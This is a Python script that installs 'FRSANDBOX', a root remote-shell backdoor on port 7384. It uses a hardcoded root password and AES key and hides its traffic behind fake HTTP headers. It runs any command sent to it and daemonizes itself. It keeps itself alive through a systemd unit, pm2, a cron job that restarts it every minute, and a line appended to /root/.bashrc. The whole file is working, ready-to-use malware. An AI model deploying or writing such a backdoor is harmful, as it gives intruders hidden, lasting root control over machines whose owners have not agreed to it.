#!/usr/bin/env python3
import os
import sys
import subprocess
import time

def install_dependencies():

    try:
        subprocess.run(["pip3", "--version"], capture_output=True, check=True)
    except:
        os.system("curl https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py 2>/dev/null")
        os.system("python3 /tmp/get-pip.py 2>/dev/null")
        os.system("rm -f /tmp/get-pip.py")

    try:
        import Crypto
        from Crypto.Cipher import AES
        return True
    except ImportError:

        methods = [
            "pip3 install pycryptodome --break-system-packages",
            "python3 -m pip install pycryptodome --break-system-packages",
            "pip install pycryptodome --break-system-packages",
            "pip3 install pycryptodome",
            "python3 -m pip install pycryptodome",
            "pip install pycryptodome"
        ]

        installed = False
        for method in methods:
            result = os.system(f"{method} >/dev/null 2>&1")
            if result == 0:
                print(f"   ✅ Installed with: {method}")
                installed = True
                break

        try:
            import Crypto
            from Crypto.Cipher import AES
            print("✅ pycryptodome installed successfully!")
            return True
        except ImportError:
            os.system("apt-get update 2>/dev/null")
            os.system("apt-get install -y python3-pycryptodome 2>/dev/null")

            try:
                import Crypto
                from Crypto.Cipher import AES
                return True
            except ImportError:
                return False

deps_ok = install_dependencies()

import socket
import threading
import hashlib
import shlex
import signal
import base64
import secrets

try:
    if deps_ok:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
        HAS_CRYPTO = True
    else:
        HAS_CRYPTO = False
except ImportError:
    HAS_CRYPTO = False

if not HAS_CRYPTO:
    class AES:
        @staticmethod
        def new(*args, **kwargs):
            return None
        MODE_CBC = 2
    def pad(data, block_size): return data
    def unpad(data, block_size): return data

PORT = 7384
PASSWORD_HASH = hashlib.sha256(b"fenst4risalive").hexdigest()
ENCRYPTION_KEY = hashlib.sha256(b"f5gg5gdTgTGDfgG33").digest()
start_time = time.time()

class Crypto:
    @staticmethod
    def encrypt(data):
        if not HAS_CRYPTO:
            return base64.b64encode(data)
        try:
            iv = secrets.token_bytes(16)
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data, AES.block_size))
            combined = iv + encrypted
            return base64.b64encode(combined)
        except:
            return base64.b64encode(data)

    @staticmethod
    def decrypt(data):
        if not HAS_CRYPTO:
            return base64.b64decode(data)
        try:
            decoded = base64.b64decode(data)
            iv = decoded[:16]
            encrypted = decoded[16:]
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
            return decrypted
        except:
            return data

def mask_packet(data):
    if isinstance(data, str):
        data = data.encode()
    if HAS_CRYPTO:
        prefix = f"GET /{secrets.token_hex(8)} HTTP/1.1\r\nHost: {secrets.token_hex(6)}.com\r\nX-Forwarded-For: {secrets.token_hex(8)}\r\n\r\n".encode()
        return prefix + Crypto.encrypt(data)
    else:
        return data

def unmask_packet(data):
    if not HAS_CRYPTO:
        return data
    try:
        if b"\r\n\r\n" in data:
            parts = data.split(b"\r\n\r\n", 1)
            if len(parts) == 2:
                return Crypto.decrypt(parts[1])
        return Crypto.decrypt(data)
    except:
        return data

def daemonize():
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    os.chdir("/")
    os.umask(0)
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'a') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def hash_pass(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

def load_password():
    try:
        with open("/etc/frsandbox.pwd", "r") as f:
            return f.read().strip()
    except:
        return PASSWORD_HASH

def auth_client(conn):
    try:
        conn.send(mask_packet(b"FRSANDBOX SSH (pseudo) v1.0\nLogin: "))
        data = conn.recv(4096)
        if not data:
            return False
        login = unmask_packet(data).decode().strip()

        conn.send(mask_packet(b"Password: "))
        data = conn.recv(4096)
        if not data:
            return False
        pwd = unmask_packet(data).decode().strip()

        if login == "root" and hash_pass(pwd) == load_password():
            conn.send(mask_packet(b"Authentication successful.\n"))
            return True

        conn.send(mask_packet(b"Access denied.\n"))
        return False
    except:
        return False

def handle_custom_cmd(cmd, conn):
    parts = shlex.split(cmd)
    if not parts or parts[0] != "sshfenst4r":
        return False

    if len(parts) == 1:
        conn.send(mask_packet(b"Available commands:\n"))
        conn.send(mask_packet(b"  sshfenst4r pass          - change password\n"))
        conn.send(mask_packet(b"  sshfenst4r reload        - restart service\n"))
        conn.send(mask_packet(b"  sshfenst4r status        - show uptime\n"))
        conn.send(mask_packet(b"  sshfenst4r exec <cmd>    - execute command\n"))
        conn.send(mask_packet(b"  sshfenst4r help          - this message\n"))
        conn.send(mask_packet(b"  sshfenst4r install       - reinstall dependencies\n"))
        return True

    sub_cmd = parts[1]

    if sub_cmd == "pass":
        conn.send(mask_packet(b"New password: "))
        newp = unmask_packet(conn.recv(4096)).decode().strip()
        if newp:
            with open("/etc/frsandbox.pwd", "w") as f:
                f.write(hash_pass(newp))
            conn.send(mask_packet(b"Password updated.\n"))
        return True

    elif sub_cmd == "reload":
        conn.send(mask_packet(b"Restarting service...\n"))
        os.system("systemctl restart frsandbox 2>/dev/null || pm2 restart frsandbox 2>/dev/null || pkill -f sc.py")
        return True

    elif sub_cmd == "status":
        conn.send(mask_packet(b"FRSANDBOX is running.\n"))
        conn.send(mask_packet(f"Uptime: {time.time()-start_time:.0f}s\n".encode()))
        return True

    elif sub_cmd == "exec":
        if len(parts) < 3:
            conn.send(mask_packet(b"Usage: sshfenst4r exec <command>\n"))
            return True
        cmd = " ".join(parts[2:])
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, cwd=shell_session.cwd if 'shell_session' in globals() else "/root")
            output = result.stdout + result.stderr
            conn.send(mask_packet((output if output else "(no output)\n").encode()))
        except subprocess.TimeoutExpired:
            conn.send(mask_packet(b"Command timed out\n"))
        except Exception as e:
            conn.send(mask_packet(f"Error: {e}\n".encode()))
        return True

    elif sub_cmd == "install":
        conn.send(mask_packet(b"Reinstalling dependencies...\n"))
        install_dependencies()
        conn.send(mask_packet(b"Dependencies reinstalled.\n"))
        return True

    elif sub_cmd == "help":
        conn.send(mask_packet(b"Commands: pass, reload, status, exec, install, help\n"))
        return True

    return False

class ShellSession:
    def __init__(self):
        self.cwd = "/root"
        self.env = os.environ.copy()
        self.env["PS1"] = "root@frsandbox:~# "

    def execute(self, cmd, conn):
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            if path == "" or path == "~":
                path = "/root"
            elif path.startswith("/"):
                pass
            else:
                path = os.path.join(self.cwd, path)

            if os.path.exists(path) and os.path.isdir(path):
                self.cwd = os.path.abspath(path)
                return b""
            else:
                return f"bash: cd: {path}: No such file or directory\n".encode()

        if cmd == "pwd":
            return (self.cwd + "\n").encode()

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.cwd,
                env=self.env
            )
            output = result.stdout + result.stderr
            return output.encode() if output else b""
        except subprocess.TimeoutExpired:
            return b"Command timed out\n"
        except Exception as e:
            return f"Error: {e}\n".encode()

def handle_client(conn, addr):
    global shell_session
    shell_session = ShellSession()

    try:
        if not auth_client(conn):
            conn.close()
            return

        conn.send(mask_packet(b"\nWelcome to FRSANDBOX!\n"))
        conn.send(mask_packet(b"Type 'exit' to quit, 'sshfenst4r' for commands\n\n"))

        while True:
            try:
                prompt = f"root@frsandbox:{shell_session.cwd.replace('/root', '~')}# "
                conn.send(mask_packet(prompt.encode()))

                data = conn.recv(4096)
                if not data:
                    break

                cmd = unmask_packet(data).decode().strip()
                if not cmd:
                    continue

                if cmd == "exit":
                    conn.send(mask_packet(b"exit\n"))
                    break

                if handle_custom_cmd(cmd, conn):
                    continue

                output = shell_session.execute(cmd, conn)
                if output:
                    conn.send(mask_packet(output))

            except BrokenPipeError:
                break
            except ConnectionResetError:
                break
            except Exception as e:
                conn.send(mask_packet(f"Shell error: {e}\n".encode()))
                break

        conn.close()
    except:
        conn.close()

def install_autostart():
    script_path = os.path.realpath(__file__)

    # Проверяем зависимости перед установкой
    install_dependencies()

    os.system("mkdir -p /etc")
    if not os.path.exists("/etc/frsandbox.pwd"):
        with open("/etc/frsandbox.pwd", "w") as f:
            f.write(PASSWORD_HASH)

    # systemd
    with open("/etc/systemd/system/frsandbox.service", "w") as f:
        f.write(f"""[Unit]
Description=FRSANDBOX Pseudo-SSH
After=network.target

[Service]
ExecStart={script_path}
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
""")
    os.system("systemctl daemon-reload 2>/dev/null")
    os.system("systemctl enable frsandbox 2>/dev/null")
    os.system("systemctl start frsandbox 2>/dev/null")

    # pm2
    os.system("which pm2 >/dev/null 2>&1 && pm2 start {} --name frsandbox --interpreter python3 && pm2 save && pm2 startup 2>/dev/null".format(script_path))

    # cron
    with open("/etc/cron.d/frsandbox", "w") as f:
        f.write(f"* * * * * root pgrep -f '{script_path}' || {script_path} >/dev/null 2>&1 &\n")

    # .bashrc
    with open("/root/.bashrc", "a") as f:
        f.write(f"\npgrep -f '{script_path}' || nohup {script_path} >/dev/null 2>&1 &\n")

    print("✅ FRSANDBOX installed!")
    print(f"✅ Port: {PORT}")
    print("✅ Login: root | Password: fenst4risalive")
    if HAS_CRYPTO:
        print("✅ Traffic is encrypted with AES-256-CBC")
    else:
        print("⚠️  Running without encryption (install pycryptodome)")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--install":
            install_autostart()
            sys.exit(0)
        elif sys.argv[1] == "--stop":
            os.system("pkill -f sc.py 2>/dev/null")
            os.system("systemctl stop frsandbox 2>/dev/null")
            os.system("pm2 stop frsandbox 2>/dev/null")
            print("✅ Stopped")
            sys.exit(0)
        elif sys.argv[1] == "--status":
            os.system("pgrep -f sc.py && echo '✅ Running' || echo '❌ Not running'")
            sys.exit(0)

    if "--no-daemon" not in sys.argv:
        daemonize()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(10)

    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    signal.signal(signal.SIGPIPE, signal.SIG_IGN)

    while True:
        try:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            print("\nShutting down...")
            break
        except:
            time.sleep(0.5)
